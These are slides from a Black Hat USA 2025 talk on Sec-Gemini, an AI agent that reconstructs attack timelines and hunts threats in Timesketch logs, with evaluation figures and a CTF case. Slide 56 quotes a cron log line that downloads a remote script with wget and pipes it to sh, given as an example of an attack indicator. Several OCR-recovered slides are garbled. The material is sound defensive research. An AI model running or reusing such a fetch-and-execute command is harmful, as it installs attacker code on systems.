---
title: "Autonomous Timeline Analysis and Threat Hunting An AI Agent for Timesketch"
speakers: ["Alex Kantchelian", "Maarten van Dantzig", "Diana Kramer"]
conference: "Black Hat"
conference_full: "Black Hat USA 2025"
edition: "USA"
year: 2025
source_pdf: "BlackHat_USA_2025_Slides/Alex Kantchelian&Maarten van Dantzig&Diana Kramer_Autonomous Timeline Analysis and Threat Hunting An AI Agent for Timesketch.pdf"
pages: 66
sha256: "ba48de2663cfbe0c0d395767dbc87112fd2198e2e463488806916b3e5c70fce0"
text_chars: 28856
ocr_pages: 8
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T22:49:12Z"
---
# Autonomous Timeline Analysis and Threat Hunting An AI Agent for Timesketch

**Speakers:** Alex Kantchelian, Maarten van Dantzig, Diana Kramer  
**Conference:** Black Hat USA 2025  
**Source:** `BlackHat_USA_2025_Slides/Alex Kantchelian&Maarten van Dantzig&Diana Kramer_Autonomous Timeline Analysis and Threat Hunting An AI Agent for Timesketch.pdf` (66 pages)

## Slide 1

Autonomous Timeline Analysis and Threat Hunting AI Log Reasoning Capability in Timesketch

Alex Kantchelian, Marteen Van Dantzig, Diana Kramer, Janosch Köpper, Eric Morley, Sadegh Momeni, Yanis Pavlidis, Elie Bursztein

with the help of **many** Googlers

#BHUSA   @BlackHatEvents

## Slide 2

## 4,000,000 _Average number of events on a freshly installed Windows server_

**#BHUSA @BlackHatEvents**

## Slide 3

### Agenda

**SCAN FOR SLIDES**

The Log Volume Problem

Forensics 101

Sec-Gemini’s Log Reasoning Capability Timesketch with Sec-Gemini

Evaluation

**#BHUSA @BlackHatEvents**

## Slide 4

The Log Volume Problem Finding the needle in a haystack

**#BHUSA @BlackHatEvents**

## Slide 5

### Anatomy of a Windows 2022 Base Image

4,000,000+ Events

Excludes sources like: netflow, DNS, other system logs

400k
Registry events
3.1M
Filesystem events  350k
(e.g. file creation / modification)
UsnJrnl events
50k  Executable Events
40k  Exec Events (per day)

**#BHUSA @BlackHatEvents**

## Slide 6

### The log volume problem

**The signal is buried in the noise**

**One attack creates a dozen log types**

**Attackers can look like normal users**

**#BHUSA @BlackHatEvents**

## Slide 7

Forensics 101 and how we do it at Google

**#BHUSA @BlackHatEvents**

## Slide 8

### Three phases of forensics

**Collection**

Fetch artifacts: disk images, process executions, and event/auth logs

**Processing**

Convert into a friendlier format. Parse, normalize, and enrich data

**Analysis**

Review artifacts - explore the timeline and check for indicators

**#BHUSA @BlackHatEvents**

## Slide 9

#### Forensics with open source tools

**Collection**

**Analysis Timesketch** Enables collaborative timeline investigations

**Collection Processin** **g libcloudforensics Plaso** Collects artifacts from Builds timelines from cloud providers collected artifacts

**#BHUSA @BlackHatEvents**

## Slide 10

#### Forensics with open source tools

###### **mvd-gcp-project**

**libcloudforensics** Collects artifacts from cloud providers

Recipe name $ dftimewolf **gcp_forensics_ts mvd-gcp-project**

###### **/tmp/disk-image.plaso**

###### **GCE disk image (copy)**

**Plaso** Builds timelines from collected artifacts

**Timesketch** Enables collaborative timeline analysis

**#BHUSA @BlackHatEvents**

## Slide 11

#### Forensics with open source tools

Analysis
Timesketch
Enables collaborative timeline
analysis

**#BHUSA @BlackHatEvents**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Forensics with open source t
gooagoagoaoaoonuandan
Aispay.name
hostname mt
Ext var/og/authlog
+ ADDTIMELINE + ADDMANUAL EVENT @ SELECT ALL UNSELECT ALL
nt lasoasherfstat : vin PlasoParsr boyfie 0 @ vet_Pasorane sk “it
stared events X
of 19 ret (0049) 2 Ww o “ fompeome 4 Msati9
bate (TE)
> 2023-10-01708:16:30.0002 (JST command executed: 1m. bash.history @
> + | mmastoorriia7aso00z | EER tosh 100075) Accepted password for root rom 851953 port 64372 seh2 @
8 : | auassoorrisestocae | ERED tesrt 20000 accepted paceword oro am 85 195XX pr $6981 seh2
> : | aossoomosznsossrz [eh pit 235228 Fed password fr root fom 48.188.X por 4746 ssh2
% :  momsoomoeznanzuz [oh pit: 725226 Fed password fr root om 4.128.X port 4746 seh?
>: massoomozesrasiz [ssh pit: 725226 Fed password for rot fom 42.128.X por 4746 seh2
%} | mzssoom02na02062 vr fa i:735226 Fed pasword for ot rom 49198 Xpot 94746 seh?
5 : | aozsroomocznazoccz | CID issn 2252251 message ropeated tines: [Faled password for root om 43.199 X por 64746 seh
 :  rozss00zvos2e42 252 [ssh pit: 725226 Fed password fr root fom 43.198.X por 4746 seh?
> : | aocsrooarosansnocae |] oor 205220 Accepted password or rot rom 43.138XX port 54746 sh
body @ (235226): Accepted password for root from 43.133.X.X port 54746 ssh2 Resende:
clip aarmaxx
daa-ype sysogtoe
datetime 2023-10-02T04-28:43.000000+00:00 ENOL TEN Sante ea
1 trom Thailand
https: www virustotal.com/quvip-
faddeess/43.138.X.X/community
mt PasPare tk
et PaaPare tk
sr) PessPase te
rt PlaaPare te
‘mt _PaseParser i
rt PlaaPare ok
 PsaPare
mt PsePase ik
ools
Analysis
Timesketch
Enables collaborative timeline
analysis
#BHUSA @BlackHatEvents
```

## Slide 12

#### Analysis with Timesketch

[1] Fetch relevant logs
[2] Recreate timeline
[3] Find the attacker!
#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Analysis with Timesketch
Security Alert: Cryptocurrency Mining
John Doe <johndoe@yourcorp.com> 11:24 AM (2 minute:
tome v
Our systems identified that your Google Cloud Platform project (id: mvd-gcp-project) may have been
compromised and used for cryptocurrency mining.
Inbox x
ago)
This activity was detected as originating from IP 34.65.13.175 and VM ID
5406509864760928785:europe-west6-a to destination IP 34.149.22.228 on remote port 9200 between
2023-10-02T03:00:00.000Z and 2023-10-02T08:00:00.000Z (UTC), though it may still be ongoing.
© __) [1] Fetch relevant logs
4
’
N
1
N
e <q [3] Find the attacker!
#BHUSA @BlackHatEvents
```

## Slide 13

**#BHUSA @BlackHatEvents**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
[case] Coinminer detection on host:"glassbro-production"
Searct
A + ADDTIMELINE + ADDMANUALEVENT @ SELECT ALL &@ UNSELECT ALL
@© vei tsbodyfte Piaso vmt_fo'stat Plaso vin1_parsediogs_Plaso
@ Abb TIMEFILTER
& Start Exploring
Find below some examples on how to explore your data
Description Example Query © data Types EB) soved searches
Search for all events rch for a data type.
Search a word in the message field
Search filenames ending with .exe
Search on the keyword field type
(exact matches & substring search) 208.6K)
Search using regex (between // )
Combine searches with AND, OR, NOT
Search events that have an url field
Search for a range of numbers
Filter by a specific date/time range (UTC)
Filter for events before or after a date (UTC)
```

## Slide 14

**#BHUSA @BlackHatEvents**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
© [case] Coinminer detection on host:"glassbro-production"
€ Search QAae@
“A + ADD TIMELINE + ADD MANUAL EVENT @ SELECT ALL ® UNSELECT ALL
@ vn1_ts:bodyfile_Piaso H vm1_fs:stat_Plaso : vm1_parsed:logs_Plaso
@ Abo TIMEFILTER
rR Start Exploring
Find below some examples on how to explore your data,
Description Example Query ® Tass © data Types E) saved searches
fact (2) Yara rule matche
Search for all events Q. Search for a data type.
Nazar
Search a word in the message field fact.1728 (3)
bashihistory:entty (15)
Search filenames ending with .exe executables ELF (16.74)
yfile:entry (303.5x)
Search on the keyword field type filename, keyword:malicious executables_Mach0 (4)
(exact matches & substring search) message. keyw fe'stat (208.6x)
cutables_PE (109)
Search using regex (between // ) : wc apt history_logientry (11)
knownhash (56.9)
Combine searches with AND, OR, NOT e. fie ft — inuxcdpkg_logrentry (615)
yara
uxutmprevent (666)
Search events that have an url field <n zerobyte-file (ae)
rae e_cofffile (28)
Search for a range of numbers status code: {200 To 2
yslog:cron:task_run (37)
Filter by a specific date/time range (UTC) datetime: (2025-07-01
Filter for events before or after a date (UTC) ee
```

## Slide 15

**#BHUSA @BlackHatEvents**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
¢
[case] Coinminer detection on host:"glassbro-production’
TIMELINE ++ ADD MANUAL EV © SELECT
@ wei fsdodyfte Paso vmt_fs:stat_Plaso i vit _parsedilogs Piaso
Q AbD TIMEFILTER
TODAY LAST7DAYS —LAST30 DAYS LAST 90 DAYS ~—_LAST 1 YEAR
2023-10-02T03:00:00.000Z 2023-10-02T08:00:00.000Z
October 2023 > > ata Types
Q Search for a data type
MON OCT 2
03 00
CANCEL ADD FILTER wnvtask run (3
Filter for events before or after a date (UTC)
Saved Searches
```

## Slide 16

**#BHUSA @BlackHatEvents**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
¢
[case] Coinminer detection on host:"glassbro-production"
@ 11 fbodyfte_Piaso vmi_festat_Plaso vm _parsed:iogs Paso
© 2023-10-02T03:00:00.0002 ~+ 2023-10-02T08:00:00.0002 +@ AbD TIMEFILTER
1-40 of 7787 events (0.0218) © uw wo Rows per page 10 of 787
Datetime (UTC) message
5
2023-10-02703:03:43,000Z _[rsyslogd] action ‘action-8-builtin:omfile' resumed (module ‘builtin:omfile! [v8.2112.0 try https://www.rsyslog.com/e/2359 ]
ry)
2023-10-02T03:03:43.000Z _[rsyslogd] action ‘action-8-builtin:omfile’ suspended (module ‘builtin:omfile), next retry is Mon Oct 2 03:04:13 2023, retry nbr 0. There should be messages before this one giving the reason for s
9
2023-10-02T03:03:43,0002 _[rsysloga] action ‘action-8-builtin:omfile’ suspended (module ‘builtin:omfile), retry 0. There should be messages before this one giving the reason for suspension. [v8.2112.0 try https://www.rsy.
)
2023-10-02T03:03:43,0002 _[systemd, pid: 1] Starting Update the local ESM caches.
o
2023-10-02T03:03:43,0002 _[systemd, pid: 1] apt-news.service: Deactivated successfully.
ry)
2023-10-02T03:03:43,000Z _[systemd, pid: 1] Finished Update APT News.
o
2023-10-02T03:03:43,0002 _[systemd, pid: 1] Starting Update APT News.
re)
2023-10-02703:03:43.8182 _vm-1 [systemnd, pid: 1] Starting Update APT News
e)
2023-10-02T03:03:43.823Z __vm-1 [systemd, pid: 1] Starting Update the local ESM caches
°
2023-10-02T03:03:43.8232 __vm-1 [rsyslogd, pid: 669] action ‘action-8-builtin:omfile' resumed (module ‘builtin:omfile) [v8.2112.0 try https://www.rsyslog.com/e/2359 ]
v9
2023-10-02703:03:43.823Z__vm-1 [rsyslogd, pid: 669] action ‘action-8-builtin:omfile' suspended (module ‘builtin:omfile), retry 0. There should be messages before this one giving the reason for suspension. [v8.2112.0 try ht.
2023-10-02703:03:43.823Z __vm-1 [rsyslogd, pid: 669] action ‘action-8-builtin:omfile' resumed (module ‘builtin:omfile) [v8.2112.0 try https://www.rsyslog.com/e/2359 }
v
oO
oO
oO
oO
oO
Oo
oO
oO
oO
oO
oO
oO
i]
oO
°
2023-10-02T03:03:43.823Z__vm-1 [rsyslogd, pid: 669] action ‘action-8-builtin:omfile' suspended (module ‘builtin:omfile), retry 0. There should be messages before this one giving the reason for suspension. [v8.2112.0 try ht.
a ®
mt parsedtiogs.Piaso
wnt parsed logs. Piaso
mt parsediogs.Piaso
vt parsedilogs.Piaso
nt parsed iogs.Piaso
mt _parsediiogs_Piaso
mt parsed logs.Piaso
nt parsed logs. Piaso
wnt parsedlogs_Piaso
nt parsedtiogs Piaso
int _parsediiogs_Piaso
mnt parsediogs.Piaso
mt parsediogs.Piaso
```

## Slide 17

**#BHUSA @BlackHatEvents**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
«
[case] Coinminer detection on host:"glassbro-production"
€ © Search
‘A + ADD TIMELINE + ADD MANUALEVENT @® SELECTALL & UNSELECT ALL
@ wm1ts:bodyfile_Plaso ; vm1_fs:stat_Plaso
@ Abb TIMEFILTER
TODAY LAST7DAYS LAST 30 DAYS LAST 90 DAYS ~—LAST 1 YEAR
2023-10-02T03:00:00.000Z 2023-10-02T08:00:00.000Z
October 2023
MON OCT 2
MON OCT 2
08 00
CANCEL ADD FILTER
vm1_parsed:logs Plaso
robyte
& data Types
Search for a data type.
1ss_logrentry (942)
bashihistory:entry (15)
entry (203.5%)
fcstat (308.6K)
linux:apt_history_log:entry (11)
linux:dpkg_logrentry (615)
pe_coffefile (23)
yslog:cron:task_sun (37)
line (21.3
B) saved searches
ara rule matche
```

## Slide 18

**#BHUSA @BlackHatEvents**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
© [case] Coinminer detection on host:"glassbro-production’
2023-10-02T04:52:06.756Z _vm-1 [crontab, pid: 236380] (root) LIST (root) nt _parsedtlogs Plaso
2023-10-02T04:52:06.762Z _ EXT:/usr/bin/pkill Type: link Owner identifier: 0 Group identifier: 0 Mode: 00777 Number of links: 1 vmi_fo:stat Plaso
2023-10-02T04:52:06.762Z executables ELF yara_ EXT-/ust/bin/pgrep Type: file Owner identifier: 0 Group identifier: 0 Mode: 00755 Number of links: 1 vni_fsstat Plaso
/gpt{e0e6a25e-82a4-47c0-8b76-6256193dbeff}/ust/bin/pkill Owner identifier: 0 Group identifier: 0 Mode: Irwxrwxrwx nt_fsbodyfie Plaso
/gpt{e0e6a25c-82a4-47c0-8b76-6256193dbeff}/ust/bin/pgrep Owner identifier: 0 Group identifier: 0 Mode: -rwxr-xr-x mt fsbodyfie_Plaso
O ye > = 202810-02704:52:06.9012 _ vm-" [crontab, pid: 236401] (root) LIST (root) nt parsed logs Plaso
Context search S 5S 108 5M 10M 30M 60M REPLACE SEARCH
‘Showing context for event:
2023-10-02704:52:06.9052 _vm-1 [crontab, pid: 236405] (root) REPLACE (root)
* t Al Summary (for 40 events in this view)
The events indicate a potential security incident involving unauthorized access and modification of system configurations. Passwords for the root and ubuntu users wer SSH connection res 205.210,31.59. The /ete/shadow file, /root/.ssh direct
root/-ssh/authorized_keys file were accessed. Additionally, there were modifications to the root user's crontab. T dent appears successful, as evidenced by t! ord changes and modifications t
1-40 of 2576 events (0.043) © w mo Rows per page 1-40 0f 2576
Datetime (UTC) message
2023-10-02704:51:11.0002 [passwd] [236348]: pam_unix(passwd:chauthtok): password changed for root mt parsed logs_Piaso
2023-10-02T04:51:11.0722 _vm-1 [passwd, pid: 236348] pam_unix(passwd:chauthtok): password changed for root wnt parsed logs_Piaso
2023-10-02T04:51:19,0002 [sshd] [236350]: Connection reset by 205.210.31.59 port 59104 [preauth] vant parsed logs_Praso
2023-10-02T04:51:19.6832 _ vm-1 [sshd, pid: 236350] Connection reset by 205.210.31.59 port 59104 [preauth] wit parsedlogs_Piaso
vant parsed logs_Piaso
2023-10-02704:51:38,0002 [passwd] [236360]: pam_unix(passwd:chauthtok): password changed for ubuntu
2023-10-02T04:51:38.664Z _EXT:/etc/shadow Type: file Owner identifier: 0 Group identifier: 42 Mode: 00640 Number of links: 1 vymi_fsstat_Plaso
```

## Slide 19

### Summarization ≠ Timeline Analysis

**Missing Narrative** Analysts must manually stitch together summaries to understand the full story

**Doesn’t Scale**

Sending millions of unfiltered log records to an AI model will be expensive and slow

Limited Reasoning

Batch processing leaves AI with a small slice view of the world at a time

**#BHUSA @BlackHatEvents**

## Slide 20

Sec-Gemini’s Log Reasoning Capability

**#BHUSA @BlackHatEvents**

## Slide 21

### Sec-Gemini

**Mission** Be the most capable cybersecurity AI for scalable and automatic protection of online products, users, and systems from AI threats and bad actors

**Sec-Gemini is experimental research GCP offers mature SecOps agents**

**App Security Vulnerability Understanding**

**Threat Intel Network Security Malware Analysis Log Reasoning**

**#BHUSA @BlackHatEvents**

## Slide 22

### Sec-Gemini’s Log Reasoning Capability

**Capable** _Investigation_ , e.g., timeline reconstruction _Detection_ , e.g., unsupervised threat hunting

**Scalable & Flexible** _raw_ , _massive_ , _heterogenous_ logs

**Autonomous** , **Explainable** and **Verifiable**

**#BHUSA @BlackHatEvents**

## Slide 23

### A Classic* Agent?

LLM fetches log record subset
repeat
Backbone LLM
Raw logs to analyze
LLM analyzes fetched records
100s of millions of events
*ReAct: Synergizing Reasoning and Acting in Language Models

**#BHUSA @BlackHatEvents**

## Slide 24

### Problems with the Classic Agent

**Context Window Overflow** fetched log records accumulate, context window fills in few steps

**LLM Loses Track of Goal** repeatedly fetches same records, persists in dead-end directions, …

**Poor Explainability** 100s of pages of free-form text: LLM outputs + log records

**#BHUSA @BlackHatEvents**

## Slide 25

Exploration Graph as Agent Memory 1/2 **Exploration Graph represents state of investigation**

**#BHUSA @BlackHatEvents**

## Slide 26

Exploration Graph as Agent Memory 1/2 **Exploration Graph represents state of investigation** Edge (→) means general logical entailment: _specialization of_ , _analysis of_ , _answer to_ , etc

**#BHUSA @BlackHatEvents**

## Slide 27

Exploration Graph as Agent Memory 1/2 **Exploration Graph represents state of investigation** Edge (→) means general logical entailment: _specialization of_ , _analysis of_ , _answer to_ , etc Four node types:

**#BHUSA @BlackHatEvents**

## Slide 28

Exploration Graph as Agent Memory 1/2 **Exploration Graph represents state of investigation** Edge (→) means general logical entailment: _specialization of_ , _analysis of_ , _answer to_ , etc Four node types: Investigative direction

**#BHUSA @BlackHatEvents**

## Slide 29

Exploration Graph as Agent Memory 1/2 **Exploration Graph represents state of investigation** Edge (→) means general logical entailment: _specialization of_ , _analysis of_ , _answer to_ , etc Four node types: Investigative direction Fetch records operation

**#BHUSA @BlackHatEvents**

## Slide 30

Exploration Graph as Agent Memory 1/2 **Exploration Graph represents state of investigation** Edge (→) means general logical entailment: _specialization of_ , _analysis of_ , _answer to_ , etc Four node types: Investigative direction Fetch records operation Observations on fetched records

**#BHUSA @BlackHatEvents**

## Slide 31

Exploration Graph as Agent Memory 1/2 **Exploration Graph represents state of investigation** Edge (→) means general logical entailment: _specialization of_ , _analysis of_ , _answer to_ , etc Four node types: Investigative direction Fetch records operation Observations on fetched records Investigative finding from fetched records

**#BHUSA @BlackHatEvents**

## Slide 32

Exploration Graph as Agent Memory 2/2 LLM updates the exploration graph in 3 phases

**#BHUSA @BlackHatEvents**

## Slide 33

Exploration Graph as Agent Memory 2/2 LLM updates the exploration graph in 3 phases

1. Examine graph and prioritize best investigative directions Append          nodes to graph

**#BHUSA @BlackHatEvents**

## Slide 34

Exploration Graph as Agent Memory 2/2 LLM updates the exploration graph in 3 phases

1. Examine graph and prioritize best investigative directions Append          nodes to graph

2. Perform fetch record ops to advance selected directions Append          nodes, environment fetches records

**#BHUSA @BlackHatEvents**

## Slide 35

Exploration Graph as Agent Memory 2/2 LLM updates the exploration graph in 3 phases

1. Examine graph and prioritize best investigative directions Append          nodes to graph

2. Perform fetch record ops to advance selected directions Append          nodes, environment fetches records

3. Analyze fetched records

Append         , and possibly nodes

**#BHUSA @BlackHatEvents**

## Slide 36

Exploration Graph as Agent Memory 2/2 LLM updates the exploration graph in 3 phases

1. Examine graph and prioritize best investigative directions Append          nodes to graph

2. Perform fetch record ops to advance selected directions Append          nodes, environment fetches records

3. Analyze fetched records

Append         , and possibly nodes Repeat

**#BHUSA @BlackHatEvents**

## Slide 37

Exploration Graph as Agent Memory 2/2 LLM updates the exploration graph in 3 phases

1. Examine graph and prioritize best investigative directions Append          nodes to graph

2. Perform fetch record ops to advance selected directions Append          nodes, environment fetches records

3. Analyze fetched records

Append         , and possibly nodes

Repeat

**#BHUSA @BlackHatEvents**

## Slide 38

Exploration Graph as Agent Memory 2/2 LLM updates the exploration graph in 3 phases

1. Examine graph and prioritize best investigative directions Append          nodes to graph

2. Perform fetch record ops to advance selected directions Append          nodes, environment fetches records

3. Analyze fetched records

Append         , and possibly nodes Repeat

**#BHUSA @BlackHatEvents**

## Slide 39

Exploration Graph as Agent Memory 2/2 LLM updates the exploration graph in 3 phases

1. Examine graph and prioritize best investigative directions Append          nodes to graph

2. Perform fetch record ops to advance selected directions Append          nodes, environment fetches records

3. Analyze fetched records Append         , and possibly nodes Repeat

**#BHUSA @BlackHatEvents**

## Slide 40

#### An Illustrative Case: Setup

**Detection signal triggers on a Linux VM**

**Sec-Gemini performs** **_blind_ investigation** Not given detection nor any starting point “find and explain all attacker actions”

**Disk imaged, raw logs extracted**

- ~1M log records, 7 different log types: syslog, filesystem, selinux, …

**#BHUSA @BlackHatEvents**

## Slide 41

#### Sec-Gemini Builds an Exploration Graph

**#BHUSA @BlackHatEvents**

## Slide 42

#### Sec-Gemini Builds an Exploration Graph

Check for SSH brute-force attacks in syslog:ssh:login log Investigate syslog and selinux logs for signs of exploit attempts (e.g., unusual system calls,… Investigate fs:stat logs for any suspicious activity

**#BHUSA @BlackHatEvents**

## Slide 43

#### Sec-Gemini Builds an Exploration Graph

Check for SSH brute-force attacks in syslog:ssh:login log Investigate syslog and selinux logs for signs of exploit attempts (e.g., unusual system calls,… Investigate fs:stat logs for any suspicious activity Fetch subset from syslog:ssh:login Fetch subset from syslog Fetch subset selinux Fetch subset from fs:stat

**#BHUSA @BlackHatEvents**

## Slide 44

#### Sec-Gemini Builds an Exploration Graph

Check for SSH brute-force attacks in syslog:ssh:login log Investigate syslog and selinux logs for signs of exploit attempts (e.g., unusual system calls,… Investigate fs:stat logs for any suspicious activity Fetch subset from syslog:ssh:login Fetch subset from syslog Fetch subset selinux Fetch subset from fs:stat

Successful SSH logins for user 'root' on 2024-11-28 from IPs: 218.92.XXX.XXX (13:04:50 UTC)...

**#BHUSA @BlackHatEvents**

## Slide 45

#### Sec-Gemini Builds an Exploration Graph

Check for SSH brute-force attacks in syslog:ssh:login log Investigate syslog and selinux logs for signs of exploit attempts (e.g., unusual system calls,… Investigate fs:stat logs for any suspicious activity Fetch subset from syslog:ssh:login

Fetch subset from syslog Fetch subset selinux

Fetch subset from fs:stat

Successful SSH logins for user 'root' on 2024-11-28 from IPs: 218.92.XXX.XXX (13:04:50 UTC)... Investigate syslog events around the times of the successful SSH logins (2024-11-28 13:04:50… Investigate fs:stat logs before and after the SSH login times (2024-11-28) to identify…

**#BHUSA @BlackHatEvents**

## Slide 46

#### Sec-Gemini Builds an Exploration Graph

Check for SSH brute-force attacks in syslog:ssh:login log Investigate syslog and selinux logs for signs of exploit attempts (e.g., unusual system calls,… Investigate fs:stat logs for any suspicious activity Fetch subset from syslog:ssh:login Fetch subset from syslog Fetch subset selinux

Fetch subset from fs:stat

Successful SSH logins for user 'root' on 2024-11-28 from IPs: 218.92.XXX.XXX (13:04:50 UTC)... Investigate syslog events around the times of the successful SSH logins (2024-11-28 13:04:50… Investigate fs:stat logs before and after the SSH login times (2024-11-28) to identify… Fetch subset from syslog Fetch subset from fs:stat

**#BHUSA @BlackHatEvents**

## Slide 47

#### Sec-Gemini Builds an Exploration Graph

Check for SSH brute-force attacks in syslog:ssh:login log Investigate syslog and selinux logs for signs of exploit attempts (e.g., unusual system calls,… Investigate fs:stat logs for any suspicious activity Fetch subset from syslog:ssh:login

Fetch subset from syslog Fetch subset selinux Fetch subset from fs:stat

Successful SSH logins for user 'root' on 2024-11-28 from IPs: 218.92.XXX.XXX (13:04:50 UTC)... Investigate syslog events around the times of the successful SSH logins (2024-11-28 13:04:50… Investigate fs:stat logs before and after the SSH login times (2024-11-28) to identify… Fetch subset from syslog Fetch subset from fs:stat

Multiple failed login attempts from 218.92.XXX.XXX immediately preceding the successful… Successful login and cron job executions, including '(/etc/cron.hourly/gcc.sh)' Suspicious activity: modifications to /etc/cron.hourly/gcc.sh, creation/modification of files… Modification of /etc/daemon.cfg and /root, and access to the suspicious file /usr/bin/ygljglkjg…

**#BHUSA @BlackHatEvents**

## Slide 48

#### Sec-Gemini Builds an Exploration Graph

Check for SSH brute-force attacks in syslog:ssh:login log Investigate syslog and selinux logs for signs of exploit attempts (e.g., unusual system calls,… Investigate fs:stat logs for any suspicious activity Fetch subset from syslog:ssh:login

Fetch subset from syslog Fetch subset selinux Fetch subset from fs:stat

Successful SSH logins for user 'root' on 2024-11-28 from IPs: 218.92.XXX.XXX (13:04:50 UTC)... Investigate syslog events around the times of the successful SSH logins (2024-11-28 13:04:50… Investigate fs:stat logs before and after the SSH login times (2024-11-28) to identify… Fetch subset from syslog Fetch subset from fs:stat

Multiple failed login attempts from 218.92.XXX.XXX immediately preceding the successful… Successful login and cron job executions, including '(/etc/cron.hourly/gcc.sh)' Suspicious activity: modifications to /etc/cron.hourly/gcc.sh, creation/modification of files… Modification of /etc/daemon.cfg and /root, and access to the suspicious file /usr/bin/ygljglkjg… [syslog:318723] Successful SSH login for user 'root' from 218.92.XXX.XXX after multiple failed… [fs:stat:355966] Creation of suspicious file /usr/bin/ygljglkjgfg0 shortly after successful SSH… [fs:stat:355965] Modification of /etc/cron.hourly/gcc.sh shortly after successful SSH brute… [fs:stat:356100] Last access timestamp for suspicious executable /usr/bin/ygljglkjgfg0,…

**#BHUSA @BlackHatEvents**

## Slide 49

#### Sec-Gemini’s Exploration Graph Takeaways

**Scale to 100M+ log lines & handle complex multi-step investigations** LLM task is to build & maintain an _explicit_ exploration graph LLM only sees targeted, _small subset of logs_ at every round

**Explainable**

Exploration graph is intuitive and lends itself to helpful visualizations

**Verifiable**

Every finding holds a reference to one or more supporting log records

**#BHUSA @BlackHatEvents**

## Slide 50

Timesketch with Sec-Gemini

How AI augments an analyst

**#BHUSA @BlackHatEvents**

## Slide 51

### AI Principles in Digital Forensics

Analysts must be explicitly aware when AI is integrated into the **Transparent** investigation process.

**Verifiable**

AI outputs must be validated by analysts, adhering to established principles and verifiable via traditional forensic methods.

**Explainable**

The AI should provide its reasoning in a way that enables analysts to fully understand how findings were derived.

**Traceable**

All AI conclusions and supporting evidence must directly link back to the original, unmutated data.

**Protected**

Uphold attorney-client privilege and secure access to any sensitive information when AI is involved.

**#BHUSA @BlackHatEvents**

## Slide 52

### A log analysis agent  in Timesketch

**#BHUSA @BlackHatEvents**

## Slide 53

### A log analysis agent  in Timesketch

Agent executes on a self-curated list
of hypotheses. Analysts review results
All conclusions come with rationale
that analyst can accept or reject
Work is linked to the specific log lines
used to make a judgement call
#BHUSA @BlackHatEvents

## Slide 54

Evaluation Scoring Sec-Gemini’s Log Reasoning performance

**#BHUSA @BlackHatEvents**

## Slide 55

### Evaluation Dataset

100 compromised VMs Average Case is Hard Diverse Compromises
real-world cases 14 log types weak password,
detected by low-FP rules 4.1M+ log records misconfiguration,
38 annotated records software vulnerability,
leaked credentials, …

**#BHUSA @BlackHatEvents**

## Slide 56

### Evaluation Task

**Task: find all attack-related indicators (entities)**

URLs, filename, IP address, process and executable names, etc 3 levels of relevance: **critical** , **important** and **supplemental** . Example:

[ **CRON** , pid: **570342** ] ( **perfkit** ) CMD ( **wget** -q -O - **http://185.122.xxx.xxx/h2.sh** | **sh** > **/dev/null** 2>&1)

**Two configurations: hinted and not-hinted**

hinted: SG given initial detection info. Akin to timeline reconstruction. not-hinted: SG not given a starting point. Akin to general threat hunting.

**#BHUSA @BlackHatEvents**

## Slide 57

### Precision & Recall

##### **Timeline Reconstruction (hinted)**

Recall on  Critical 53%
Recall on  Important 40%
Recall on  Suppl . 25%
Precision 12%

##### **Threat Hunting (not hinted)**

Recall on  Critical 47%
Recall on  Important 42%
Recall on  Suppl . 21%
Precision 11%

**#BHUSA @BlackHatEvents**

## Slide 58

Sec-Gemini finds **53%** of **critical indicators** across **millions of logs** for under **$3**

**#BHUSA @BlackHatEvents**

## Slide 59

#### CTF scenario

Your mad scientist boss was contacted by the FBI. They found his recently-developed Szechuan sauce recipe on the dark web. How was our recipe stolen?

_CTF created by James Smith,_ _<u>DFIRmadness.com</u>_ **~~#BHUSA @~~ BlackHatEvents**

## Slide 60

### Sec-Gemini on forensics CTF

- Nightmare – Disk Image Only

- Difficult – Disk and Memory

- Moderate – Disk, Memory, and Autoruns

- Easy – Disk, Memory, Autoruns, and PCAPS

**#BHUSA @BlackHatEvents**

## Slide 61

### Sec-Gemini on forensics CTF

- **Nightmare – Disk Image Only**

- Difficult – Disk and Memory

- Moderate – Disk, Memory, and Autoruns

- Easy – Disk, Memory, Autoruns, and PCAPS

**#BHUSA @BlackHatEvents**

## Slide 62

### Sec-Gemini on forensics CTF

**Configuration Indicator recall Questions answered** Scenario included

**#BHUSA @BlackHatEvents**

## Slide 63

### Sec-Gemini on forensics CTF

**Configuration Indicator recall Questions answered** Scenario included 60% of critical 22 out of 30 indicators

**#BHUSA @BlackHatEvents**

## Slide 64

### Sec-Gemini on forensics CTF

**Configuration Indicator recall Questions answered** Scenario included 60% of critical 22 out of 30 indicators **_Fully autonomous_** 50% of critical 20 out of 30 No scenario included indicators

**#BHUSA @BlackHatEvents**

## Slide 65

# **Want To Learn More?**

##### **Trusted Tester Program**

<u>bit.ly/46x9GLr</u>

**Other Talks/Events Blackhat Demos:   Google Cloud Security Booth #2240 August 7: 2pm Arsenal Demos:    Business Hall, Arsenal Station 7 August 7: 1pm**

**GenSec CTF:         LVCC West Hall, Level 1, 302 August 8 - 10**

**#BHUSA @BlackHatEvents**

## Slide 66

#### Thank you

mvd@google.com akant@google.com

**SCAN FOR SLIDES**

**#BHUSA @BlackHatEvents**
